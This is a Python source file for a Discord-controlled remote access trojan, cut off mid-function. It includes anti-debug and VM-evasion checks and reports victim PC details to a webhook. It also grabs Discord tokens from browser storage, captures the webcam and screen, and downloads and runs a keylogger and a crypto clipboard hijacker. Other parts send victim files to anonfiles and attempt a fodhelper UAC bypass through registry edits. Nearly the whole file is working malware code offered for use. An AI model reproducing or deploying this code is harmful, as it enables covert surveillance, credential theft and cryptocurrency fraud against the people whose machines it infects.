import subprocess
import discord
import json 
import asyncio 
import ctypes 
import os
import subprocess as sp
from h11 import SERVER
import requests 
import cv2
from queue import Queue
import socket
import time  
import win32clipboard
import win32gui
import win32com.client as wincl
import re
import sys
import shutil
import inspect
import ctypes.wintypes
import urllib.request
from pynput.keyboard import Key, Controller
import pyautogui
from PIL import ImageGrab
from functools import partial
import winreg as reg
import comtypes
import threading
import requests.exceptions

import uuid
import platform, wmi, psutil
from datetime import datetime
import sounddevice as sd
from scipy.io.wavfile import write


from urllib.request import Request, urlopen
from time import sleep
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *
from discord.ext import commands
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow

## Auto Commands | leave here for now
# from auto import *
from Crypto.Cipher import AES
from requests import get


'''
Input information
'''
webhook = 'DISCORD_WEBHOOK_URL'
server_id = "DISCORD_SERVER_ID"
g = [int(server_id)]



'''
Anti Debug
'''
vmcheck_switch = True
vtdetect_switch = True
listcheck_switch = True
anti_debug_switch = True


#region Anti Debug
def block_debugger():
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            if processName == "HTTPDebuggerUI.exe":
                os._exit(1)
            if processName == "HTTPDebuggerSvc.exe":
                os._exit(1)
            if processName == "Taskmgr.exe":
                os._exit(1)
            if processName == "ProcessHacker.exe":
                os._exit(1)
            if processName == "Wireshark.exe":
                os._exit(1)
            if processName == "OLLYDBG.EXE":
                os._exit(1)
            if processName == "x64dbg.exe":
                os._exit(1)   
            if processName == "x32dbg.exe":
                os._exit(1)     
            if processName == "x96dbg.exe":
                os._exit(1)
            if processName == "ida64.exe":
                os._exit(1)   
            if processName == "KsDumperClient.exe":
                os._exit(1) 
            if processName == "KsDumper.exe":
                os._exit(1) 
            if processName == "pestudio.exe":
                os._exit(1)
            if processName == "Fiddler.exe":
                os._exit(1)
        except:
            pass

def block_dlls():
    time.sleep(0.7)
    try:
        sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
        requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
        os._exit(1)
    except:
        pass  

def getip():
    ip = "None"
    try: ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

ip = getip()

serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
api = webhook

def vtdetect():
    data_from_check = (f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {computer.Win32_VideoController()[0].Name}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")
    return data_from_check

def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1) # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
            os._exit(1)
            
        if os.path.exists(virtualbox_dll):
            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass        

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    registry_check()
    processes_and_files_check()
    mac_check()

def listcheck():
    try:
        if hwid in hwidlist.text:
            requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            os._exit(1)
        else:
            pass
    except:
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
            os._exit(1)
        else:
            pass
    except:
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        time.sleep(2) 
        os._exit(1)

    try:
        if ip in iplist.text:
            requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        time.sleep(2) 
        os._exit(1)

    try:
        if mac in maclist.text:
            requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        time.sleep(2) 
        os._exit(1)

    gpu = computer.Win32_VideoController()[0].Name

    try:
        if gpu in gpulist.text:        
            requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        time.sleep(2) 
        os._exit(1)

if anti_debug_switch == True:
    try:
        threading.Thread(name='Anti-Debug', target=block_debugger).start()
        threading.Thread(name='Anti-DLL', target=block_dlls).start()
    except: pass
else: pass

try:
    if vtdetect_switch == True: vtdetect()
    else: pass
    if vmcheck_switch == True: vmcheck()
    else: pass
    if listcheck_switch == True: listcheck()
    else: pass
except Exception as e:
    requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})
    os._exit(1)
#endregion


#region Main RAT
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Remote Access Tool', help_command=None)
slash = SlashCommand(client, sync_commands=True)

#region Events
@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('Discord BOT missing correct permissions, please make sure to give the BOT admin perms')
    else:
        requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    global data_from_check
    value1 = f"> Gained access to **`{os.getlogin()}`** system!"
    if is_admin == True:
        my_embed = discord.Embed(title=f'{value1} with **`admin`** perms', description=f"{vtdetect()}", color=0x3A3636)
    elif is_admin == False:
        my_embed = discord.Embed(title=value1, description=f"{vtdetect()}", color=0x3A3636)
    await channel.send(embed=my_embed)
    game = discord.Game(f"RAT | cookiesservices.xyz")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()
#endregion

#region Functions
def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

def critproc():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
#endregion

#region RAT Commands
@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    my_embed = discord.Embed(title=f"Killing all inactive sessions, please wait", color=0x3A3636)
    await ctx.send(embed=my_embed)
    try: 
        for y in range(len(on_ready.total)): 
            if "session" in on_ready.total[y]:
                channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                await channel_to_delete.delete()
            else:
                pass
        my_embed = discord.Embed(title=f"Killed all the inactive sessions", color=0x00FF00)
        await ctx.send(embed=my_embed)
    except Exception as e:
        my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
        await ctx.send(embed=my_embed)


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="YES"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="NO"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            await ctx.send(content="Exited the program", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


@slash.slash(name="info", description="gather info about the user (ip)", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            jak = str(platform.uname())
            intro = jak[12:]
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            my_embed = discord.Embed(title=f"Command executed : {intro} {pp}", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="geolocate", description="geo locate the victim (not very accurate)", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                my_embed = discord.Embed(title=f"Command executed : {link}", color=0x00FF00)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="keyloggerstop", description="stop keylogger", guild_ids=g)
async def keyloggerstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            temp = (os.getenv("temp"))
            if os.path.exists(f'{temp}\\$~cache\\sd.exe'):
                try:
                    for proc in psutil.process_iter():
                        if proc.name() == "sd.exe":
                            proc.kill()
                    os.remove(f'{temp}\$~cache\sd.exe')
                except Exception as e:
                    my_embed = discord.Embed(title=f"Error occured while stopping keylogger\n\n{e}", color=0xFF0000)
                    await ctx.send(embed=my_embed)
                my_embed = discord.Embed(title=f"Keylogger stopped and uninstalled successfully", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Error no running keylogger found", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="KeyLogger", description="start a key logger on their pc (with created add on exe)", guild_ids=g)
async def KeyLogger_command(ctx: SlashContext, keylogger_downlod_link: str):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Downloading Key Logger, please wait", color=0x3A3636)
        await ctx.send(embed=my_embed)
        temp = (os.getenv("temp"))

        try:
            #? Create cache folder
            if os.path.exists(f'{temp}\\$~cache'):
                pass
            else:
                os.mkdir(f'{temp}\$~cache')

            #? Download Keylogger
            url = keylogger_downlod_link
            r = requests.get(f"{url}")
            with open(f'{temp}\\$~cache\\sd.exe', 'wb') as f:
                f.write(r.content)
            f.close()

            #? Run KeyLogger
            os.startfile(f'{temp}\\$~cache\\sd.exe')
            my_embed = discord.Embed(title=f"Key Logger started successfully", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured! \n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="forceAdmin", description="attempt to force admin, Works but very buggy", guild_ids=g)
async def forceAdmin_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                my_embed = discord.Embed(title=f"You are already admin", color=0xFF0000)
                await ctx.send(embed=my_embed)
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                my_embed = discord.Embed(title=f"Attempting to get admin, please wait", color=0x3A3636)
                await ctx.send(embed=my_embed)
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
                os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def tokens_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Extracting tokens, please wait", color=0x3A3636)
        await ctx.send(embed=my_embed)

        async def find_tokens(path):
            path += '\\Local Storage\\leveldb'

            tokens = []

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens

        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = await find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        try:
            my_embed = discord.Embed(title="Tokens Grabbed", description=message, color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            global stop_threads
            stop_threads = False

            threading.Thread(target=between_callback, args=(client,)).start()
            my_embed = discord.Embed(title=f"Window logging for this session started", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            global stop_threads
            stop_threads = True

            my_embed = discord.Embed(title=f"Window logging for this session stopped", color=0x00FF00)
            await ctx.send(embed=my_embed)
            game = discord.Game(f"RAT | cookiesservices.xyz")
            await client.change_presence(status=discord.Status.online, activity=game)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height

@slash.slash(name="webcam", description="takes a picture of their webcam", guild_ids=g)
async def webcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
            camera = cv2.VideoCapture(0)
            return_value,image = camera.read()
            cv2.imwrite(temp,image)
            camera.release()
            file = discord.File(temp, filename="webcam.jpg")
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
            ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
            screen = pyautogui.screenshot()
            screen.save(temp)
            file = discord.File(temp, filename="monitor.png")
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            MaxVolume()
            my_embed = discord.Embed(title=f"Volume set to 100%", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            MuteVolume()
            my_embed = discord.Embed(title=f"Volume set to 0%", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="CryptoClipper", description="infect victims clipboard for crypto addresses, Admin privileges required", guild_ids=g)
async def CryptoClipper_command(ctx: SlashContext, clipboard_injector_link: str):
    if ctx.channel.name == channel_name:
        try:
            temp = (os.getenv("temp"))
            '''
            Download Clipper
            '''
            file = f'{temp}\\$~cache\\zClipper.exe'
            r = requests.get(clipboard_injector_link)
            with open(file, 'wb') as f:
                f.write(r.content)
            f.close()

            '''
            Start Clipper
            '''
            os.startfile(file)
            my_embed = discord.Embed(title=f"Clipboard infected (process running in background)", color=0x00FF00)
            await ctx.send(embed=my_embed)

        except Exception as e:
            my_embed = discord.Embed(title=f"{os.getlogin()}", description=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="StopCryptoClipper", description="Stop Crypto Clipper, Admin privileges required", guild_ids=g)
async def StopCryptoClipper_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(f"taskkill /F /IM zClipper.exe")
                my_embed = discord.Embed(title=f"Clipper killed succesfully", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"{os.getlogin()}", description=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Voice", description="voice message of your choice", guild_ids=g)
async def Voice_command(ctx: SlashContext, voicespeak: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title=f"Voice message sent!\n{voicespeak}", color=0x00FF00)
            await ctx.send(embed=my_embed)
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(voicespeak)
            comtypes.CoUninitialize()
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Download", description="download file from victim", guild_ids=g)
async def Download_command(ctx: SlashContext, downloadfile: str):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Attempting to upload file to annon files for easy download", color=0x3A3636)
        await ctx.send(embed=my_embed)
        try:
            files = {
                'file': (downloadfile, open(downloadfile, 'rb')),
            }

            url = 'https://api.anonfiles.com/upload'
            response = requests.post(url, files=files)

            data = response.json()
            file = (data['data']['file']['url']['short'])
            my_embed = discord.Embed(title=f"Successfully downloaded file {downloadfile} \n\n{file}", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="Upload", description="upload file to victims pc and run it", guild_ids=g)
async def Upload_command(ctx: SlashContext, file_url: str, filename: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title=f"Uploading file please wait (eta 30-60s)", color=0x00FF00)
            await ctx.send(embed=my_embed)
            temp = (os.getenv("temp"))

            '''
            Download File
            '''
            file = f'{temp}\\$~cache\\{filename}.exe'
            r = requests.get(file_url)
            with open(file, 'wb') as f:
                f.write(r.content)
            f.close()

            '''
            Start File
            '''
            os.startfile(file)
            my_embed = discord.Embed(title=f"File uploaded and running", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"{os.getlogin()}", description=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="StreamWebCam", description="Stream webcam, time format (hh:mm:ss)", guild_ids=g)
async def StreamWebCam_command(ctx: SlashContext, stream_time: str):
    if ctx.channel.name == channel_name:
        try:
            def convert_seconds(time_str):
                hh, mm, ss = time_str.split(':')
                return int(hh) * 3600 + int(mm) * 60 + int(ss)

            time_length = stream_time 
            seconds_length = convert_seconds(time_length) 
            global end
            end = time.time() + seconds_length

            async def StreamWebcam(end):
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\\hobos\\hellos.txt"        
                if os.path.isfile(hellos):
                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                else:
                    pass
                while time.time() < end:
                    temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
                    camera = cv2.VideoCapture(0)
                    return_value,image = camera.read()
                    cv2.imwrite(temp,image)
                    camera.release()
                    file = discord.File(temp, filename="webcam.jpg")
                    await ctx.send(file=file)
                    hellos = temp + r"\\hobos\\hellos.txt"
                    if os.path.isfile(hellos):
                        break
                    else:
                        continue

                if time.time() > end:
                    my_embed = discord.Embed(title=f"Finshed streaming webcam", color=0x00FF00)
                    await ctx.send(embed=my_embed)
            
            my_embed = discord.Embed(title=f"Streaming webcam for {seconds_length} Seconds", color=0x00FF00)
            await ctx.send(embed=my_embed)
            await StreamWebcam(end) 
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed) 
            

@slash.slash(name="DisplayOFF", description="Turns users Display OFF, Admin rights needed", guild_ids=g)
async def DisplayOFF_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="DisplayON", description="Turns users Display ON, Admin rights needed", guild_ids=g)
async def DisplayON_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
